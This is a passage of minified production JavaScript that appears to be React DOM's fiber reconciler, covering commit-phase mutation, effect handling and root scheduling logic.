                                    Ms(r.nodeValue, n, (t.mode & 1) !== 0);
                        }
                    i && (e.flags |= 4);
                } else (r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r)), (r[dt] = e), (e.stateNode = r);
            }
            return ve(e), null;
        case 13:
            if (
                (q(Q),
                (r = e.memoizedState),
                t === null || (t.memoizedState !== null && t.memoizedState.dehydrated !== null))
            ) {
                if (K && Ae !== null && e.mode & 1 && !(e.flags & 128)) gh(), or(), (e.flags |= 98560), (i = !1);
                else if (((i = Us(e)), r !== null && r.dehydrated !== null)) {
                    if (t === null) {
                        if (!i) throw Error(S(318));
                        if (((i = e.memoizedState), (i = i !== null ? i.dehydrated : null), !i)) throw Error(S(317));
                        i[dt] = e;
                    } else or(), !(e.flags & 128) && (e.memoizedState = null), (e.flags |= 4);
                    ve(e), (i = !1);
                } else tt !== null && (Qa(tt), (tt = null)), (i = !0);
                if (!i) return e.flags & 65536 ? e : null;
            }
            return e.flags & 128
                ? ((e.lanes = n), e)
                : ((r = r !== null),
                  r !== (t !== null && t.memoizedState !== null) &&
                      r &&
                      ((e.child.flags |= 8192),
                      e.mode & 1 && (t === null || Q.current & 1 ? oe === 0 && (oe = 3) : Zl())),
                  e.updateQueue !== null && (e.flags |= 4),
                  ve(e),
                  null);
        case 4:
            return lr(), Fa(t, e), t === null && rs(e.stateNode.containerInfo), ve(e), null;
        case 10:
            return Ll(e.type._context), ve(e), null;
        case 17:
            return Re(e.type) && xi(), ve(e), null;
        case 19:
            if ((q(Q), (i = e.memoizedState), i === null)) return ve(e), null;
            if (((r = (e.flags & 128) !== 0), (o = i.rendering), o === null))
                if (r) Nr(i, !1);
                else {
                    if (oe !== 0 || (t !== null && t.flags & 128))
                        for (t = e.child; t !== null; ) {
                            if (((o = Ei(t)), o !== null)) {
                                for (
                                    e.flags |= 128,
                                        Nr(i, !1),
                                        r = o.updateQueue,
                                        r !== null && ((e.updateQueue = r), (e.flags |= 4)),
                                        e.subtreeFlags = 0,
                                        r = n,
                                        n = e.child;
                                    n !== null;

                                )
                                    (i = n),
                                        (t = r),
                                        (i.flags &= 14680066),
                                        (o = i.alternate),
                                        o === null
                                            ? ((i.childLanes = 0),
                                              (i.lanes = t),
                                              (i.child = null),
                                              (i.subtreeFlags = 0),
                                              (i.memoizedProps = null),
                                              (i.memoizedState = null),
                                              (i.updateQueue = null),
                                              (i.dependencies = null),
                                              (i.stateNode = null))
                                            : ((i.childLanes = o.childLanes),
                                              (i.lanes = o.lanes),
                                              (i.child = o.child),
                                              (i.subtreeFlags = 0),
                                              (i.deletions = null),
                                              (i.memoizedProps = o.memoizedProps),
                                              (i.memoizedState = o.memoizedState),
                                              (i.updateQueue = o.updateQueue),
                                              (i.type = o.type),
                                              (t = o.dependencies),
                                              (i.dependencies =
                                                  t === null
                                                      ? null
                                                      : { lanes: t.lanes, firstContext: t.firstContext })),
                                        (n = n.sibling);
                                return V(Q, (Q.current & 1) | 2), e.child;
                            }
                            t = t.sibling;
                        }
                    i.tail !== null && ee() > cr && ((e.flags |= 128), (r = !0), Nr(i, !1), (e.lanes = 4194304));
                }
            else {
                if (!r)
                    if (((t = Ei(o)), t !== null)) {
                        if (
                            ((e.flags |= 128),
                            (r = !0),
                            (n = t.updateQueue),
                            n !== null && ((e.updateQueue = n), (e.flags |= 4)),
                            Nr(i, !0),
                            i.tail === null && i.tailMode === "hidden" && !o.alternate && !K)
                        )
                            return ve(e), null;
                    } else
                        2 * ee() - i.renderingStartTime > cr &&
                            n !== 1073741824 &&
                            ((e.flags |= 128), (r = !0), Nr(i, !1), (e.lanes = 4194304));
                i.isBackwards
                    ? ((o.sibling = e.child), (e.child = o))
                    : ((n = i.last), n !== null ? (n.sibling = o) : (e.child = o), (i.last = o));
            }
            return i.tail !== null
                ? ((e = i.tail),
                  (i.rendering = e),
                  (i.tail = e.sibling),
                  (i.renderingStartTime = ee()),
                  (e.sibling = null),
                  (n = Q.current),
                  V(Q, r ? (n & 1) | 2 : n & 1),
                  e)
                : (ve(e), null);
        case 22:
        case 23:
            return (
                Yl(),
                (r = e.memoizedState !== null),
                t !== null && (t.memoizedState !== null) !== r && (e.flags |= 8192),
                r && e.mode & 1 ? Ie & 1073741824 && (ve(e), e.subtreeFlags & 6 && (e.flags |= 8192)) : ve(e),
                null
            );
        case 24:
            return null;
        case 25:
            return null;
    }
    throw Error(S(156, e.tag));
}
function S0(t, e) {
    switch ((Ol(e), e.tag)) {
        case 1:
            return Re(e.type) && xi(), (t = e.flags), t & 65536 ? ((e.flags = (t & -65537) | 128), e) : null;
        case 3:
            return (
                lr(),
                q(Te),
                q(xe),
                Fl(),
                (t = e.flags),
                t & 65536 && !(t & 128) ? ((e.flags = (t & -65537) | 128), e) : null
            );
        case 5:
            return zl(e), null;
        case 13:
            if ((q(Q), (t = e.memoizedState), t !== null && t.dehydrated !== null)) {
                if (e.alternate === null) throw Error(S(340));
                or();
            }
            return (t = e.flags), t & 65536 ? ((e.flags = (t & -65537) | 128), e) : null;
        case 19:
            return q(Q), null;
        case 4:
            return lr(), null;
        case 10:
            return Ll(e.type._context), null;
        case 22:
        case 23:
            return Yl(), null;
        case 24:
            return null;
        default:
            return null;
    }
}
var Fs = !1,
    ye = !1,
    j0 = typeof WeakSet == "function" ? WeakSet : Set,
    P = null;
function Qn(t, e) {
    var n = t.ref;
    if (n !== null)
        if (typeof n == "function")
            try {
                n(null);
            } catch (r) {
                Z(t, e, r);
            }
        else n.current = null;
}
function Ba(t, e, n) {
    try {
        n();
    } catch (r) {
        Z(t, e, r);
    }
}
var vc = !1;
function E0(t, e) {
    if (((ja = mi), (t = rh()), Tl(t))) {
        if ("selectionStart" in t) var n = { start: t.selectionStart, end: t.selectionEnd };
        else
            e: {
                n = ((n = t.ownerDocument) && n.defaultView) || window;
                var r = n.getSelection && n.getSelection();
                if (r && r.rangeCount !== 0) {
                    n = r.anchorNode;
                    var s = r.anchorOffset,
                        i = r.focusNode;
                    r = r.focusOffset;
                    try {
                        n.nodeType, i.nodeType;
                    } catch {
                        n = null;
                        break e;
                    }
                    var o = 0,
                        a = -1,
                        l = -1,
                        c = 0,
                        d = 0,
                        h = t,
                        f = null;
                    t: for (;;) {
                        for (
                            var v;
                            h !== n || (s !== 0 && h.nodeType !== 3) || (a = o + s),
                                h !== i || (r !== 0 && h.nodeType !== 3) || (l = o + r),
                                h.nodeType === 3 && (o += h.nodeValue.length),
                                (v = h.firstChild) !== null;

                        )
                            (f = h), (h = v);
                        for (;;) {
                            if (h === t) break t;
                            if (
                                (f === n && ++c === s && (a = o),
                                f === i && ++d === r && (l = o),
                                (v = h.nextSibling) !== null)
                            )
                                break;
                            (h = f), (f = h.parentNode);
                        }
                        h = v;
                    }
                    n = a === -1 || l === -1 ? null : { start: a, end: l };
                } else n = null;
            }
        n = n || { start: 0, end: 0 };
    } else n = null;
    for (Ea = { focusedElem: t, selectionRange: n }, mi = !1, P = e; P !== null; )
        if (((e = P), (t = e.child), (e.subtreeFlags & 1028) !== 0 && t !== null)) (t.return = e), (P = t);
        else
            for (; P !== null; ) {
                e = P;
                try {
                    var y = e.alternate;
                    if (e.flags & 1024)
                        switch (e.tag) {
                            case 0:
                            case 11:
                            case 15:
                                break;
                            case 1:
                                if (y !== null) {
                                    var _ = y.memoizedProps,
                                        b = y.memoizedState,
                                        g = e.stateNode,
                                        p = g.getSnapshotBeforeUpdate(e.elementType === e.type ? _ : Ye(e.type, _), b);
                                    g.__reactInternalSnapshotBeforeUpdate = p;
                                }
                                break;
                            case 3:
                                var m = e.stateNode.containerInfo;
                                m.nodeType === 1
                                    ? (m.textContent = "")
                                    : m.nodeType === 9 && m.documentElement && m.removeChild(m.documentElement);
                                break;
                            case 5:
                            case 6:
                            case 4:
                            case 17:
                                break;
                            default:
                                throw Error(S(163));
                        }
                } catch (w) {
                    Z(e, e.return, w);
                }
                if (((t = e.sibling), t !== null)) {
                    (t.return = e.return), (P = t);
                    break;
                }
                P = e.return;
            }
    return (y = vc), (vc = !1), y;
}
function Br(t, e, n) {
    var r = e.updateQueue;
    if (((r = r !== null ? r.lastEffect : null), r !== null)) {
        var s = (r = r.next);
        do {
            if ((s.tag & t) === t) {
                var i = s.destroy;
                (s.destroy = void 0), i !== void 0 && Ba(e, n, i);
            }
            s = s.next;
        } while (s !== r);
    }
}
function Ki(t, e) {
    if (((e = e.updateQueue), (e = e !== null ? e.lastEffect : null), e !== null)) {
        var n = (e = e.next);
        do {
            if ((n.tag & t) === t) {
                var r = n.create;
                n.destroy = r();
            }
            n = n.next;
        } while (n !== e);
    }
}
function Va(t) {
    var e = t.ref;
    if (e !== null) {
        var n = t.stateNode;
        switch (t.tag) {
            case 5:
                t = n;
                break;
            default:
                t = n;
        }
        typeof e == "function" ? e(t) : (e.current = t);
    }
}
function Zh(t) {
    var e = t.alternate;
    e !== null && ((t.alternate = null), Zh(e)),
        (t.child = null),
        (t.deletions = null),
        (t.sibling = null),
        t.tag === 5 &&
            ((e = t.stateNode), e !== null && (delete e[dt], delete e[is], delete e[Pa], delete e[l0], delete e[u0])),
        (t.stateNode = null),
        (t.return = null),
        (t.dependencies = null),
        (t.memoizedProps = null),
        (t.memoizedState = null),
        (t.pendingProps = null),
        (t.stateNode = null),
        (t.updateQueue = null);
}
function ef(t) {
    return t.tag === 5 || t.tag === 3 || t.tag === 4;
}
function yc(t) {
    e: for (;;) {
        for (; t.sibling === null; ) {
            if (t.return === null || ef(t.return)) return null;
            t = t.return;
        }
        for (t.sibling.return = t.return, t = t.sibling; t.tag !== 5 && t.tag !== 6 && t.tag !== 18; ) {
            if (t.flags & 2 || t.child === null || t.tag === 4) continue e;
            (t.child.return = t), (t = t.child);
        }
        if (!(t.flags & 2)) return t.stateNode;
    }
}
function Wa(t, e, n) {
    var r = t.tag;
    if (r === 5 || r === 6)
        (t = t.stateNode),
            e
                ? n.nodeType === 8
                    ? n.parentNode.insertBefore(t, e)
                    : n.insertBefore(t, e)
                : (n.nodeType === 8 ? ((e = n.parentNode), e.insertBefore(t, n)) : ((e = n), e.appendChild(t)),
                  (n = n._reactRootContainer),
                  n != null || e.onclick !== null || (e.onclick = yi));
    else if (r !== 4 && ((t = t.child), t !== null))
        for (Wa(t, e, n), t = t.sibling; t !== null; ) Wa(t, e, n), (t = t.sibling);
}
function Ha(t, e, n) {
    var r = t.tag;
    if (r === 5 || r === 6) (t = t.stateNode), e ? n.insertBefore(t, e) : n.appendChild(t);
    else if (r !== 4 && ((t = t.child), t !== null))
        for (Ha(t, e, n), t = t.sibling; t !== null; ) Ha(t, e, n), (t = t.sibling);
}
var ue = null,
    Ze = !1;
function Rt(t, e, n) {
    for (n = n.child; n !== null; ) tf(t, e, n), (n = n.sibling);
}
function tf(t, e, n) {
    if (ht && typeof ht.onCommitFiberUnmount == "function")
        try {
            ht.onCommitFiberUnmount(zi, n);
        } catch {}
    switch (n.tag) {
        case 5:
            ye || Qn(n, e);
        case 6:
            var r = ue,
                s = Ze;
            (ue = null),
                Rt(t, e, n),
                (ue = r),
                (Ze = s),
                ue !== null &&
                    (Ze
                        ? ((t = ue),
                          (n = n.stateNode),
                          t.nodeType === 8 ? t.parentNode.removeChild(n) : t.removeChild(n))
                        : ue.removeChild(n.stateNode));
            break;
        case 18:
            ue !== null &&
                (Ze
                    ? ((t = ue),
                      (n = n.stateNode),
                      t.nodeType === 8 ? $o(t.parentNode, n) : t.nodeType === 1 && $o(t, n),
                      es(t))
                    : $o(ue, n.stateNode));
            break;
        case 4:
            (r = ue), (s = Ze), (ue = n.stateNode.containerInfo), (Ze = !0), Rt(t, e, n), (ue = r), (Ze = s);
            break;
        case 0:
        case 11:
        case 14:
        case 15:
            if (!ye && ((r = n.updateQueue), r !== null && ((r = r.lastEffect), r !== null))) {
                s = r = r.next;
                do {
                    var i = s,
                        o = i.destroy;
                    (i = i.tag), o !== void 0 && (i & 2 || i & 4) && Ba(n, e, o), (s = s.next);
                } while (s !== r);
            }
            Rt(t, e, n);
            break;
        case 1:
            if (!ye && (Qn(n, e), (r = n.stateNode), typeof r.componentWillUnmount == "function"))
                try {
                    (r.props = n.memoizedProps), (r.state = n.memoizedState), r.componentWillUnmount();
                } catch (a) {
                    Z(n, e, a);
                }
            Rt(t, e, n);
            break;
        case 21:
            Rt(t, e, n);
            break;
        case 22:
            n.mode & 1 ? ((ye = (r = ye) || n.memoizedState !== null), Rt(t, e, n), (ye = r)) : Rt(t, e, n);
            break;
        default:
            Rt(t, e, n);
    }
}
function xc(t) {
    var e = t.updateQueue;
    if (e !== null) {
        t.updateQueue = null;
        var n = t.stateNode;
        n === null && (n = t.stateNode = new j0()),
            e.forEach(function (r) {
                var s = A0.bind(null, t, r);
                n.has(r) || (n.add(r), r.then(s, s));
            });
    }
}
function Je(t, e) {
    var n = e.deletions;
    if (n !== null)
        for (var r = 0; r < n.length; r++) {
            var s = n[r];
            try {
                var i = t,
                    o = e,
                    a = o;
                e: for (; a !== null; ) {
                    switch (a.tag) {
                        case 5:
                            (ue = a.stateNode), (Ze = !1);
                            break e;
                        case 3:
                            (ue = a.stateNode.containerInfo), (Ze = !0);
                            break e;
                        case 4:
                            (ue = a.stateNode.containerInfo), (Ze = !0);
                            break e;
                    }
                    a = a.return;
                }
                if (ue === null) throw Error(S(160));
                tf(i, o, s), (ue = null), (Ze = !1);
                var l = s.alternate;
                l !== null && (l.return = null), (s.return = null);
            } catch (c) {
                Z(s, e, c);
            }
        }
    if (e.subtreeFlags & 12854) for (e = e.child; e !== null; ) nf(e, t), (e = e.sibling);
}
function nf(t, e) {
    var n = t.alternate,
        r = t.flags;
    switch (t.tag) {
        case 0:
        case 11:
        case 14:
        case 15:
            if ((Je(e, t), lt(t), r & 4)) {
                try {
                    Br(3, t, t.return), Ki(3, t);
                } catch (_) {
                    Z(t, t.return, _);
                }
                try {
                    Br(5, t, t.return);
                } catch (_) {
                    Z(t, t.return, _);
                }
            }
            break;
        case 1:
            Je(e, t), lt(t), r & 512 && n !== null && Qn(n, n.return);
            break;
        case 5:
            if ((Je(e, t), lt(t), r & 512 && n !== null && Qn(n, n.return), t.flags & 32)) {
                var s = t.stateNode;
                try {
                    Jr(s, "");
                } catch (_) {
                    Z(t, t.return, _);
                }
            }
            if (r & 4 && ((s = t.stateNode), s != null)) {
                var i = t.memoizedProps,
                    o = n !== null ? n.memoizedProps : i,
                    a = t.type,
                    l = t.updateQueue;
                if (((t.updateQueue = null), l !== null))
                    try {
                        a === "input" && i.type === "radio" && i.name != null && Sd(s, i), ma(a, o);
                        var c = ma(a, i);
                        for (o = 0; o < l.length; o += 2) {
                            var d = l[o],
                                h = l[o + 1];
                            d === "style"
                                ? Pd(s, h)
                                : d === "dangerouslySetInnerHTML"
                                  ? Nd(s, h)
                                  : d === "children"
                                    ? Jr(s, h)
                                    : vl(s, d, h, c);
                        }
                        switch (a) {
                            case "input":
                                ca(s, i);
                                break;
                            case "textarea":
                                jd(s, i);
                                break;
                            case "select":
                                var f = s._wrapperState.wasMultiple;
                                s._wrapperState.wasMultiple = !!i.multiple;
                                var v = i.value;
                                v != null
                                    ? Xn(s, !!i.multiple, v, !1)
                                    : f !== !!i.multiple &&
                                      (i.defaultValue != null
                                          ? Xn(s, !!i.multiple, i.defaultValue, !0)
                                          : Xn(s, !!i.multiple, i.multiple ? [] : "", !1));
                        }
                        s[is] = i;
                    } catch (_) {
                        Z(t, t.return, _);
                    }
            }
            break;
        case 6:
            if ((Je(e, t), lt(t), r & 4)) {
                if (t.stateNode === null) throw Error(S(162));
                (s = t.stateNode), (i = t.memoizedProps);
                try {
                    s.nodeValue = i;
                } catch (_) {
                    Z(t, t.return, _);
                }
            }
            break;
        case 3:
            if ((Je(e, t), lt(t), r & 4 && n !== null && n.memoizedState.isDehydrated))
                try {
                    es(e.containerInfo);
                } catch (_) {
                    Z(t, t.return, _);
                }
            break;
        case 4:
            Je(e, t), lt(t);
            break;
        case 13:
            Je(e, t),
                lt(t),
                (s = t.child),
                s.flags & 8192 &&
                    ((i = s.memoizedState !== null),
                    (s.stateNode.isHidden = i),
                    !i || (s.alternate !== null && s.alternate.memoizedState !== null) || (Jl = ee())),
                r & 4 && xc(t);
            break;
        case 22:
            if (
                ((d = n !== null && n.memoizedState !== null),
                t.mode & 1 ? ((ye = (c = ye) || d), Je(e, t), (ye = c)) : Je(e, t),
                lt(t),
                r & 8192)
            ) {
                if (((c = t.memoizedState !== null), (t.stateNode.isHidden = c) && !d && t.mode & 1))
                    for (P = t, d = t.child; d !== null; ) {
                        for (h = P = d; P !== null; ) {
                            switch (((f = P), (v = f.child), f.tag)) {
                                case 0:
                                case 11:
                                case 14:
                                case 15:
                                    Br(4, f, f.return);
                                    break;
                                case 1:
                                    Qn(f, f.return);
                                    var y = f.stateNode;
                                    if (typeof y.componentWillUnmount == "function") {
                                        (r = f), (n = f.return);
                                        try {
                                            (e = r),
                                                (y.props = e.memoizedProps),
                                                (y.state = e.memoizedState),
                                                y.componentWillUnmount();
                                        } catch (_) {
                                            Z(r, n, _);
                                        }
                                    }
                                    break;
                                case 5:
                                    Qn(f, f.return);
                                    break;
                                case 22:
                                    if (f.memoizedState !== null) {
                                        _c(h);
                                        continue;
                                    }
                            }
                            v !== null ? ((v.return = f), (P = v)) : _c(h);
                        }
                        d = d.sibling;
                    }
                e: for (d = null, h = t; ; ) {
                    if (h.tag === 5) {
                        if (d === null) {
                            d = h;
                            try {
                                (s = h.stateNode),
                                    c
                                        ? ((i = s.style),
                                          typeof i.setProperty == "function"
                                              ? i.setProperty("display", "none", "important")
                                              : (i.display = "none"))
                                        : ((a = h.stateNode),
                                          (l = h.memoizedProps.style),
                                          (o = l != null && l.hasOwnProperty("display") ? l.display : null),
                                          (a.style.display = Cd("display", o)));
                            } catch (_) {
                                Z(t, t.return, _);
                            }
                        }
                    } else if (h.tag === 6) {
                        if (d === null)
                            try {
                                h.stateNode.nodeValue = c ? "" : h.memoizedProps;
                            } catch (_) {
                                Z(t, t.return, _);
                            }
                    } else if (
                        ((h.tag !== 22 && h.tag !== 23) || h.memoizedState === null || h === t) &&
                        h.child !== null
                    ) {
                        (h.child.return = h), (h = h.child);
                        continue;
                    }
                    if (h === t) break e;
                    for (; h.sibling === null; ) {
                        if (h.return === null || h.return === t) break e;
                        d === h && (d = null), (h = h.return);
                    }
                    d === h && (d = null), (h.sibling.return = h.return), (h = h.sibling);
                }
            }
            break;
        case 19:
            Je(e, t), lt(t), r & 4 && xc(t);
            break;
        case 21:
            break;
        default:
            Je(e, t), lt(t);
    }
}
function lt(t) {
    var e = t.flags;
    if (e & 2) {
        try {
            e: {
                for (var n = t.return; n !== null; ) {
                    if (ef(n)) {
                        var r = n;
                        break e;
                    }
                    n = n.return;
                }
                throw Error(S(160));
            }
            switch (r.tag) {
                case 5:
                    var s = r.stateNode;
                    r.flags & 32 && (Jr(s, ""), (r.flags &= -33));
                    var i = yc(t);
                    Ha(t, i, s);
                    break;
                case 3:
                case 4:
                    var o = r.stateNode.containerInfo,
                        a = yc(t);
                    Wa(t, a, o);
                    break;
                default:
                    throw Error(S(161));
            }
        } catch (l) {
            Z(t, t.return, l);
        }
        t.flags &= -3;
    }
    e & 4096 && (t.flags &= -4097);
}
function N0(t, e, n) {
    (P = t), rf(t);
}
function rf(t, e, n) {
    for (var r = (t.mode & 1) !== 0; P !== null; ) {
        var s = P,
            i = s.child;
        if (s.tag === 22 && r) {
            var o = s.memoizedState !== null || Fs;
            if (!o) {
                var a = s.alternate,
                    l = (a !== null && a.memoizedState !== null) || ye;
                a = Fs;
                var c = ye;
                if (((Fs = o), (ye = l) && !c))
                    for (P = s; P !== null; )
                        (o = P),
                            (l = o.child),
                            o.tag === 22 && o.memoizedState !== null
                                ? bc(s)
                                : l !== null
                                  ? ((l.return = o), (P = l))
                                  : bc(s);
                for (; i !== null; ) (P = i), rf(i), (i = i.sibling);
                (P = s), (Fs = a), (ye = c);
            }
            wc(t);
        } else s.subtreeFlags & 8772 && i !== null ? ((i.return = s), (P = i)) : wc(t);
    }
}
function wc(t) {
    for (; P !== null; ) {
        var e = P;
        if (e.flags & 8772) {
            var n = e.alternate;
            try {
                if (e.flags & 8772)
                    switch (e.tag) {
                        case 0:
                        case 11:
                        case 15:
                            ye || Ki(5, e);
                            break;
                        case 1:
                            var r = e.stateNode;
                            if (e.flags & 4 && !ye)
                                if (n === null) r.componentDidMount();
                                else {
                                    var s = e.elementType === e.type ? n.memoizedProps : Ye(e.type, n.memoizedProps);
                                    r.componentDidUpdate(s, n.memoizedState, r.__reactInternalSnapshotBeforeUpdate);
                                }
                            var i = e.updateQueue;
                            i !== null && sc(e, i, r);
                            break;
                        case 3:
                            var o = e.updateQueue;
                            if (o !== null) {
                                if (((n = null), e.child !== null))
                                    switch (e.child.tag) {
                                        case 5:
                                            n = e.child.stateNode;
                                            break;
                                        case 1:
                                            n = e.child.stateNode;
                                    }
                                sc(e, o, n);
                            }
                            break;
                        case 5:
                            var a = e.stateNode;
                            if (n === null && e.flags & 4) {
                                n = a;
                                var l = e.memoizedProps;
                                switch (e.type) {
                                    case "button":
                                    case "input":
                                    case "select":
                                    case "textarea":
                                        l.autoFocus && n.focus();
                                        break;
                                    case "img":
                                        l.src && (n.src = l.src);
                                }
                            }
                            break;
                        case 6:
                            break;
                        case 4:
                            break;
                        case 12:
                            break;
                        case 13:
                            if (e.memoizedState === null) {
                                var c = e.alternate;
                                if (c !== null) {
                                    var d = c.memoizedState;
                                    if (d !== null) {
                                        var h = d.dehydrated;
                                        h !== null && es(h);
                                    }
                                }
                            }
                            break;
                        case 19:
                        case 17:
                        case 21:
                        case 22:
                        case 23:
                        case 25:
                            break;
                        default:
                            throw Error(S(163));
                    }
                ye || (e.flags & 512 && Va(e));
            } catch (f) {
                Z(e, e.return, f);
            }
        }
        if (e === t) {
            P = null;
            break;
        }
        if (((n = e.sibling), n !== null)) {
            (n.return = e.return), (P = n);
            break;
        }
        P = e.return;
    }
}
function _c(t) {
    for (; P !== null; ) {
        var e = P;
        if (e === t) {
            P = null;
            break;
        }
        var n = e.sibling;
        if (n !== null) {
            (n.return = e.return), (P = n);
            break;
        }
        P = e.return;
    }
}
function bc(t) {
    for (; P !== null; ) {
        var e = P;
        try {
            switch (e.tag) {
                case 0:
                case 11:
                case 15:
                    var n = e.return;
                    try {
                        Ki(4, e);
                    } catch (l) {
                        Z(e, n, l);
                    }
                    break;
                case 1:
                    var r = e.stateNode;
                    if (typeof r.componentDidMount == "function") {
                        var s = e.return;
                        try {
                            r.componentDidMount();
                        } catch (l) {
                            Z(e, s, l);
                        }
                    }
                    var i = e.return;
                    try {
                        Va(e);
                    } catch (l) {
                        Z(e, i, l);
                    }
                    break;
                case 5:
                    var o = e.return;
                    try {
                        Va(e);
                    } catch (l) {
                        Z(e, o, l);
                    }
            }
        } catch (l) {
            Z(e, e.return, l);
        }
        if (e === t) {
            P = null;
            break;
        }
        var a = e.sibling;
        if (a !== null) {
            (a.return = e.return), (P = a);
            break;
        }
        P = e.return;
    }
}
var C0 = Math.ceil,
    Pi = Et.ReactCurrentDispatcher,
    Kl = Et.ReactCurrentOwner,
    qe = Et.ReactCurrentBatchConfig,
    M = 0,
    le = null,
    te = null,
    ce = 0,
    Ie = 0,
    Jn = en(0),
    oe = 0,
    ds = null,
    Sn = 0,
    Qi = 0,
    Ql = 0,
    Vr = null,
    Ne = null,
    Jl = 0,
    cr = 1 / 0,
    gt = null,
    Ti = !1,
    qa = null,
    Kt = null,
    Bs = !1,
    Ft = null,
    Ri = 0,
    Wr = 0,
    Ga = null,
    si = -1,
    ii = 0;
function ke() {
    return M & 6 ? ee() : si !== -1 ? si : (si = ee());
}
function Qt(t) {
    return t.mode & 1
        ? M & 2 && ce !== 0
            ? ce & -ce
            : d0.transition !== null
              ? (ii === 0 && (ii = Fd()), ii)
              : ((t = D), t !== 0 || ((t = window.event), (t = t === void 0 ? 16 : Kd(t.type))), t)
        : 1;
}
function rt(t, e, n, r) {
    if (50 < Wr) throw ((Wr = 0), (Ga = null), Error(S(185)));
    gs(t, n, r),
        (!(M & 2) || t !== le) &&
            (t === le && (!(M & 2) && (Qi |= n), oe === 4 && Mt(t, ce)),
            Oe(t, r),
            n === 1 && M === 0 && !(e.mode & 1) && ((cr = ee() + 500), Hi && tn()));
}
function Oe(t, e) {
    var n = t.callbackNode;
    dm(t, e);
    var r = pi(t, t === le ? ce : 0);
    if (r === 0) n !== null && Ru(n), (t.callbackNode = null), (t.callbackPriority = 0);
    else if (((e = r & -r), t.callbackPriority !== e)) {
        if ((n != null && Ru(n), e === 1))
            t.tag === 0 ? c0(kc.bind(null, t)) : fh(kc.bind(null, t)),
                o0(function () {
                    !(M & 6) && tn();
                }),
                (n = null);
        else {
            switch (Bd(r)) {
                case 1:
                    n = bl;
                    break;
                case 4:
                    n = Dd;
                    break;
                case 16:
                    n = fi;
                    break;
                case 536870912:
                    n = zd;
                    break;
                default:
                    n = fi;
            }
            n = hf(n, sf.bind(null, t));
        }
        (t.callbackPriority = e), (t.callbackNode = n);
    }
}
function sf(t, e) {
    if (((si = -1), (ii = 0), M & 6)) throw Error(S(327));
    var n = t.callbackNode;
    if (nr() && t.callbackNode !== n) return null;
    var r = pi(t, t === le ? ce : 0);
    if (r === 0) return null;
    if (r & 30 || r & t.expiredLanes || e) e = Oi(t, r);
    else {
        e = r;
        var s = M;
        M |= 2;
        var i = af();
        (le !== t || ce !== e) && ((gt = null), (cr = ee() + 500), yn(t, e));
        do
            try {
                R0();
                break;
            } catch (a) {
                of(t, a);
            }
        while (!0);
        Al(), (Pi.current = i), (M = s), te !== null ? (e = 0) : ((le = null), (ce = 0), (e = oe));
    }
    if (e !== 0) {
        if ((e === 2 && ((s = wa(t)), s !== 0 && ((r = s), (e = Ka(t, s)))), e === 1))
            throw ((n = ds), yn(t, 0), Mt(t, r), Oe(t, ee()), n);
        if (e === 6) Mt(t, r);
        else {
            if (
                ((s = t.current.alternate),
                !(r & 30) &&
                    !P0(s) &&
                    ((e = Oi(t, r)), e === 2 && ((i = wa(t)), i !== 0 && ((r = i), (e = Ka(t, i)))), e === 1))
            )
                throw ((n = ds), yn(t, 0), Mt(t, r), Oe(t, ee()), n);
            switch (((t.finishedWork = s), (t.finishedLanes = r), e)) {
                case 0:
                case 1:
                    throw Error(S(345));
                case 2:
                    un(t, Ne, gt);
                    break;
                case 3:
                    if ((Mt(t, r), (r & 130023424) === r && ((e = Jl + 500 - ee()), 10 < e))) {
                        if (pi(t, 0) !== 0) break;
                        if (((s = t.suspendedLanes), (s & r) !== r)) {
                            ke(), (t.pingedLanes |= t.suspendedLanes & s);
                            break;
                        }
                        t.timeoutHandle = Ca(un.bind(null, t, Ne, gt), e);
                        break;
                    }
                    un(t, Ne, gt);
                    break;
                case 4:
                    if ((Mt(t, r), (r & 4194240) === r)) break;
                    for (e = t.eventTimes, s = -1; 0 < r; ) {
                        var o = 31 - nt(r);
                        (i = 1 << o), (o = e[o]), o > s && (s = o), (r &= ~i);
                    }
                    if (
                        ((r = s),
                        (r = ee() - r),
                        (r =
                            (120 > r
                                ? 120
                                : 480 > r
                                  ? 480
                                  : 1080 > r
                                    ? 1080
                                    : 1920 > r
                                      ? 1920
                                      : 3e3 > r
                                        ? 3e3
                                        : 4320 > r
                                          ? 4320
                                          : 1960 * C0(r / 1960)) - r),
                        10 < r)
                    ) {
                        t.timeoutHandle = Ca(un.bind(null, t, Ne, gt), r);
                        break;
                    }
                    un(t, Ne, gt);
                    break;
                case 5:
                    un(t, Ne, gt);
                    break;
                default:
                    throw Error(S(329));
            }
        }
    }
    return Oe(t, ee()), t.callbackNode === n ? sf.bind(null, t) : null;
}
function Ka(t, e) {
    var n = Vr;
    return (
        t.current.memoizedState.isDehydrated && (yn(t, e).flags |= 256),
        (t = Oi(t, e)),
        t !== 2 && ((e = Ne), (Ne = n), e !== null && Qa(e)),
        t
    );
}
function Qa(t) {
    Ne === null ? (Ne = t) : Ne.push.apply(Ne, t);
}
function P0(t) {
    for (var e = t; ; ) {
        if (e.flags & 16384) {
            var n = e.updateQueue;
            if (n !== null && ((n = n.stores), n !== null))
                for (var r = 0; r < n.length; r++) {
                    var s = n[r],
                        i = s.getSnapshot;
                    s = s.value;
                    try {
                        if (!st(i(), s)) return !1;
                    } catch {
                        return !1;
                    }
                }
        }
        if (((n = e.child), e.subtreeFlags & 16384 && n !== null)) (n.return = e), (e = n);
        else {
            if (e === t) break;
            for (; e.sibling === null; ) {
                if (e.return === null || e.return === t) return !0;
                e = e.return;
            }
            (e.sibling.return = e.return), (e = e.sibling);
        }
    }
    return !0;
}
function Mt(t, e) {
    for (e &= ~Ql, e &= ~Qi, t.suspendedLanes |= e, t.pingedLanes &= ~e, t = t.expirationTimes; 0 < e; ) {
        var n = 31 - nt(e),
            r = 1 << n;
        (t[n] = -1), (e &= ~r);
    }
}
function kc(t) {
    if (M & 6) throw Error(S(327));
    nr();
    var e = pi(t, 0);
    if (!(e & 1)) return Oe(t, ee()), null;
    var n = Oi(t, e);
    if (t.tag !== 0 && n === 2) {
        var r = wa(t);
        r !== 0 && ((e = r), (n = Ka(t, r)));
    }
    if (n === 1) throw ((n = ds), yn(t, 0), Mt(t, e), Oe(t, ee()), n);
    if (n === 6) throw Error(S(345));
    return (t.finishedWork = t.current.alternate), (t.finishedLanes = e), un(t, Ne, gt), Oe(t, ee()), null;
}
function Xl(t, e) {
    var n = M;
    M |= 1;
    try {
        return t(e);
    } finally {
        (M = n), M === 0 && ((cr = ee() + 500), Hi && tn());
    }
}
function jn(t) {
    Ft !== null && Ft.tag === 0 && !(M & 6) && nr();
    var e = M;
    M |= 1;
    var n = qe.transition,
        r = D;
    try {
